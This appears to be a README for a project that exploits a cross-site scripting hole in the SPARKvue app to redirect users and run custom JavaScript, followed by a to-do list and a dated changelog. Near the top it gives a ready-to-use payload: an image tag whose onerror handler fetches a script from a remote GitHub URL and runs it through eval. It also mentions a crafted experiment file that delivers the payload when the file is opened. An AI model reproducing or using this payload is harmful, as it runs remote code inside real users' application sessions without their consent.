## A JS Script For Redirection And Custom Javascript Execution For The SPARKvue XSS Vulnerability Found By ohonbob

Run it using:
```
<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
```

Or Download The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App

## ToDo
- ~~Make Icon's Show up for Every URL~~
- Make the custom URL's stay when you export the .spklab file
  currently working, change the link from /sparxss.js to /Testing/test4.js, __no changes are final__

## Changelog

10/26/2023
- Found out you have to click the textbox to update it before exporting to make the links actually save
- 

10/25/2023
- Basic link saving functionality added
- The hyperlink button now accepts pressing enter to add a hyperlink

10/24/2023
- The checkpoint2 and getFaviconUrl functions have been combined into 1 function (only checkpoint2 now)
- The Hyperlink URL can now have https:// when it could not before
- Uploaded New SparXSS.spklab file to reflect the updates made so far
